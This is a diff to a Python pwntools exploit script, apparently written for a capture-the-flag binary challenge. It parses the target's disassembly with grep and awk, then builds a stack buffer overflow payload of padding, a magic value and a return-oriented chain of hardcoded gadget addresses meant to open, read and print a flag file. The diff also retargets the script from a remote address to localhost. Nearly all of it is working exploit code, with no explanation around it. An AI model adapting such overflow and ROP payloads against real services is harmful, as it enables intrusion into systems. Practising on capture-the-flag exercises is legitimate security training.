@@ -66,7 +66,7 @@ for i in range(len(lines)):
 #addr = p64(int(proc.read().replace('\n',''),16))
 #proc.close()
 #print(addr)
-#addr = p64(0x401183)
+addr = p64(0x401183)
 
 cmd = "grep '<open>:' bin_2.asm |awk '{print $1}'"
 proc = os.popen(cmd)
@@ -82,9 +82,11 @@ print(readaddr)
 
 flagaddr = p64(0x40a2b5)
 #openflag = p32(0x0)
-fd = p32(0x6)
+fd = p32(0x3)
 printaddr = p64(0x40a2aa)
 #printaddr = p64(0x40c008)
+#printaddr = p64(0x40bfe8)
+printaddr = p64(0x40c020)
 length = p64(0x20)
 
 cmd = " awk '/<vuln>:/,/lea/{print}' bin_2.asm"
@@ -95,15 +97,32 @@ if buflen > 2**63:
     buflen = 2**64 - buflen
 magic = p32(int(buf[5].split('\t')[2].split()[1].split(',')[0][1:],16))
 rbp = b'A'*8
-shellcode = b'A'*(buflen-4)+magic+rbp+openaddr+readaddr+flagaddr+fd+printaddr+length
-#shellcode = b'A'*(buflen-4)+magic+rbp+addr
+
+#shellcode = b'A'*(buflen-4)+magic+rbp+openaddr+readaddr+flagaddr+fd+printaddr+length
+#shellcode = b'A'*(buflen-4)+magic+rbp+addr+addr+addr
+
+context.arch='amd64'
+
+elf = ELF('./bin_2')
+rop = ROP(elf)
+#rop.call('open',[flagaddr,0])
+#rop.call('read',[3, printaddr])
+#rop.call('puts',[printaddr])
+#rop.call('puts',[flagaddr])
+#rop.call('flag')
+#rop.call('flag')
+#rop.chain()
+#print(rop.dump())
+#ropbytes = bytes(rop)
+#shellcode = b'A'*(buflen-4)+magic+rbp+ropbytes
+shellcode = b'A'*(buflen-4)+magic+rbp+p64(0x401001)+p64(0x401083)+p64(0x403863)+p64(0x100)+p64(0x403d94)
 
 #cmd = "chmod +x bin_2"
 #os.system(cmd)
 #io = process('./bin_2')
 
-io = remote('10.102.60.248',1180)
-#io = remote('127.0.0.1',5000)
+#io = remote('10.102.60.248',1180)
+io = remote('127.0.0.1',5000)
 
 io.recvuntil(' hmmm.....')
 io.sendline(ifname)
@@ -112,9 +131,5 @@ io.sendline(shellcode)
 print(magic)
 print(rbp)
 print(shellcode)
-print(io.recvline())
-print(io.recvline())
-print(io.recvline())
-print(io.recvline())
-print(io.recvline())
-print(io.recvline())
+print(io.recvall())
+
